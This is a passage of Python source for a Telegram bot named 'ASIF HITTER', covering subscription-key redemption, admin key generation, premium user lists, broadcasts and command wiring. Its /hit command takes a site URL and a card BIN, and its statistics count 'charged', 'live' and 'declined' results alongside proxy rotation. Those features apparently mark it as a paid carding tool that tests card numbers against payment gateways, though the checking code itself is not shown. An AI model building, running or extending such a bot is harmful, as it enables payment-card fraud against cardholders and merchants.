            f"{e('🔑')} <b>Key:</b> <code>{key}</code>\n"
            f"{e('⏱️')} <b>Expires:</b> <code>{expiry[:10]}</code>\n"
            f"{e('💎')} <b>Plan:</b> <code>{dur}</code>\n\n"
            f"{e('🚀')} Use /hit to start!\n{e('❤️')} Welcome!", parse_mode=ParseMode.HTML
        )
    except Exception as ex: log.error(f"redeem: {ex}")

# ═══════════════════════════════════════════════════════════════
# /status
# ═══════════════════════════════════════════════════════════════

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    try:
        uid = update.effective_user.id
        if ia(uid):
            await update.message.reply_text(f"{e('⚡')} {e('👑')} <b>ADMIN</b>\nPermanent access", parse_mode=ParseMode.HTML)
        elif ip(uid):
            pd = jload(FILES["premium"]); u = pd["users"].get(str(uid),{})
            await update.message.reply_text(f"{e('👑')} <b>PREMIUM</b>\n{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>\n{e('💎')} Plan: <code>{u.get('plan','?')}</code>", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"{e('⛔')} <b>FREE</b>\n{e('🔑')} /redeem &lt;key&gt;", parse_mode=ParseMode.HTML)
    except Exception as ex: log.error(f"status: {ex}")

# ═══════════════════════════════════════════════════════════════
# ADMIN COMMANDS
# ═══════════════════════════════════════════════════════════════

async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not ia(update.effective_user.id): return
    try:
        if len(ctx.args) < 2:
            await update.message.reply_text(f"{e('⚠️')} <code>/genkey 10 24</code>", parse_mode=ParseMode.HTML)
            return
        count, hours = int(ctx.args[0]), int(ctx.args[1])
        kd = jload(FILES["keys"]); new = []
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        for _ in range(count):
            k = f"ASIF-{''.join(random.choices(chars, k=20))}"
            while k in kd.get("keys",{}): k = f"ASIF-{''.join(random.choices(chars, k=20))}"
            kd["keys"][k] = {"hours":hours,"used":False,"used_by":None,"created":datetime.now().isoformat()}
            new.append(k)
        jsave(FILES["keys"], kd)
        dur = f"{hours}h" if hours < 24 else f"{hours//24}d"
        txt = f"{e('🎁')} <b>KEYS</b> ({count}x {dur})\n\n" + "\n".join([f"<code>{k}</code>" for k in new])
        if len(new) > 15:
            buf = StringIO("\n".join(new))
            await update.message.reply_document(InputFile(buf, filename="keys.txt"), caption=f"{count} keys ({dur})")
        else: await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
    except Exception as ex: log.error(f"genkey: {ex}")

async def cmd_premium_list(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not ia(update.effective_user.id): return
    try:
        pd = jload(FILES["premium"]); users = pd.get("users",{})
        if not users:
            await update.message.reply_text(f"{e('❌')} No users", parse_mode=ParseMode.HTML)
            return
        txt = f"{e('👑')} <b>PREMIUM USERS ({len(users)})</b>\n\n"
        for uid, u in users.items():
            try:
                exp = datetime.fromisoformat(u.get("expiry","2000-01-01"))
                txt += f"{e('🟢') if datetime.now()<exp else e('🔴')} <a href=\"tg://user?id={uid}\">{h(u.get('name','?'))}</a>\n   {e('⏱️')} {u.get('expiry','?')[:10]} | {e('💎')} {u.get('plan','?')}\n\n"
            except: pass
        await update.message.reply_text(txt[:3900], parse_mode=ParseMode.HTML)
    except Exception as ex: log.error(f"premium: {ex}")

async def cmd_rmsub(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not ia(update.effective_user.id): return
    try:
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} /rmsub &lt;user_id&gt;", parse_mode=ParseMode.HTML)
            return
        uid = ctx.args[0]; pd = jload(FILES["premium"])
        if uid in pd.get("users",{}):
            del pd["users"][uid]; jsave(FILES["premium"], pd)
            await update.message.reply_text(f"{e('✅')} Removed", parse_mode=ParseMode.HTML)
        else: await update.message.reply_text(f"{e('❌')} Not found", parse_mode=ParseMode.HTML)
    except Exception as ex: log.error(f"rmsub: {ex}")

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not ia(update.effective_user.id): return
    try:
        msg = update.message.text.replace("/broadcast","",1).strip()
        if not msg:
            await update.message.reply_text(f"{e('⚠️')} /broadcast &lt;msg&gt;", parse_mode=ParseMode.HTML)
            return
        pd = jload(FILES["premium"]); users = pd.get("users",{})
        st = await update.message.reply_text(f"{e('📢')} Broadcasting to {len(users)}...", parse_mode=ParseMode.HTML)
        sent = 0
        for uid in users:
            try:
                await ctx.bot.send_message(int(uid), f"{e('📢')} <b>BROADCAST</b>\n{sep()}\n\n{msg}", parse_mode=ParseMode.HTML)
                sent += 1; await asyncio.sleep(0.2)
            except: pass
        await st.edit_text(f"{e('✅')} Sent: <b>{sent}</b>", parse_mode=ParseMode.HTML)
    except Exception as ex: log.error(f"broadcast: {ex}")

async def cmd_sethits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message or not ia(update.effective_user.id): return
    try:
        if ctx.args:
            ss("log_channel", ctx.args[0])
            await update.message.reply_text(f"{e('✅')} Log: {h(ctx.args[0])}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(f"{e('ℹ️')} /sethits @channel", parse_mode=ParseMode.HTML)
    except Exception as ex: log.error(f"sethits: {ex}")

# ═══════════════════════════════════════════════════════════════
# CALLBACKS
# ═══════════════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        q = update.callback_query; await q.answer(); d = q.data; uid = q.from_user.id
        if d == "gate_help":
            await q.message.reply_text(f"{e('🌐')} <b>Gateway</b>\n<code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
        elif d == "hit_help":
            await q.message.reply_text(f"{e('💳')} <b>Hit</b>\n{e('👑')} Premium!\n<code>/hit &lt;url&gt; &lt;bin&gt;</code>", parse_mode=ParseMode.HTML)
        elif d == "redeem_help":
            await q.message.reply_text(f"{e('🔑')} <b>Redeem</b>\n<code>/redeem &lt;key&gt;</code>\nKeys: <code>ASIF-XXXX...</code>", parse_mode=ParseMode.HTML)
        elif d == "status":
            await cmd_status(update, ctx)
        elif d == "proxy_menu":
            proxies = gp(uid); mp = gs("max_proxies",6)
            await q.message.reply_text(f"{e('🔐')} <b>Proxy ({len(proxies)}/{mp})</b>\n/addproxy | /proxy | /rmproxy", parse_mode=ParseMode.HTML)
        elif d == "stats_view":
            stats = jload(FILES["stats"])
            await q.message.reply_text(f"{e('📊')} <b>STATS</b>\n\n{e('🎯')} Hits: <b>{stats.get('total',0)}</b>\n{e('🟢')} Charged: <b>{stats.get('charged',0)}</b>\n{e('🔵')} Live: <b>{stats.get('live',0)}</b>\n🔴 Declined: <b>{stats.get('declined',0)}</b>", parse_mode=ParseMode.HTML)
        elif d == "admin_panel" and ia(uid):
            await q.message.reply_text(f"{e('⚡')} <b>ADMIN</b>\n/genkey | /premium | /rmsub | /broadcast | /sethits", parse_mode=ParseMode.HTML)
    except Exception as ex: log.error(f"callback: {ex}")

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    print("""
╔══════════════════════════════════════════╗
║     ASIF HITTER v5.1 — STABLE RELEASE   ║
║     Dev: Asif Sakhani                   ║
╚══════════════════════════════════════════╝
    """)
    
    if BOT_TOKEN in ("YOUR_BOT_TOKEN_HERE", ""):
        print("❌ BOT_TOKEN not set!")
        sys.exit(1)
    
    os.makedirs(DIR, exist_ok=True)
    
    app = Application.builder().token(BOT_TOKEN).concurrent_updates(True).build()
    app.add_error_handler(error_handler)
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("addproxy", cmd_addproxy))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("rmproxy", cmd_rmproxy))
    app.add_handler(CommandHandler("gate", cmd_gate))
    app.add_handler(CommandHandler("hit", cmd_hit))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("auth", cmd_redeem))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("premium", cmd_premium_list))
    app.add_handler(CommandHandler("rmsub", cmd_rmsub))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("sethits", cmd_sethits))
    app.add_handler(CallbackQueryHandler(on_callback))
    
    print("✅ Bot RUNNING! CTRL+C to stop.")
    
    try:
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except KeyboardInterrupt:
        print("\n✅ Stopped.")

if __name__ == "__main__":
    main()